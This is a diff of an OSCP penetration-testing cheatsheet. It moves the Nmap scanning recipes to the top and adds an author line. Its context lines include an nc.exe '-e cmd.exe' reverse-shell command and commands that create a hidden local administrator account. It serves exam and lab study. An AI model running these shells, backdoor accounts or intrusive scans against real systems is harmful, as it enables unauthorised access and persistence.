@@ -45,9 +45,40 @@ echo Start-Process "C:\Users\public\nc.exe" -ArgumentList "-e cmd.exe 192.168.11
     service_exec(conn, r'cmd /c net user bill pass /add')
     service_exec(conn, r'cmd /c net localgroup administrators bill /add') 
 
-# OSCP Cheatsheet
+# OSCP Cheatsheet By DABTAN
 
 The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going. 
+
+Personel:
+
+## Nmap
+
+### Initial Fast TCP Scan
+
+```bash
+sudo nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
+```
+
+### Full TCP Scan
+
+```bash
+sudo nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
+```
+
+### Top 100 UDP Scan
+
+```bash
+sudo nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
+```
+
+### Full Vulnerability scan
+
+```bash
+sudo nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
+```
+
+### Thats That. The rest is boring
+
 
 **THIS IS WORK IN PROGRESS**
 
@@ -244,38 +275,7 @@ autorecon -vv 192.168.0.1
 
 ***
 
-## Nmap
 
-### Initial Fast TCP Scan
-
-```bash
-sudo nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan_192.168.0.1 192.168.0.1
-```
-
-### Full TCP Scan
-
-```bash
-sudo nmap -v -sS -Pn -sV -p 0-65535 -oA full_scan_192.168.0.1 192.168.0.1
-```
-
-### Limited Full TCP Scan
-*If the syn scan is taking very long to complete, the following command is an alternative (no service detection).*
-
-```bash
-nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.0.1
-```
-
-### Top 100 UDP Scan
-
-```bash
-sudo nmap -v -sU -T4 -Pn --top-ports 100 -oA top_100_UDP_192.168.0.1 192.168.0.1
-```
-
-### Full Vulnerability scan
-
-```bash
-sudo nmap -v -sS  -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan_192.168.0.1 192.168.0.1
-```
 
 ### Vulners Vulnerability Script
 
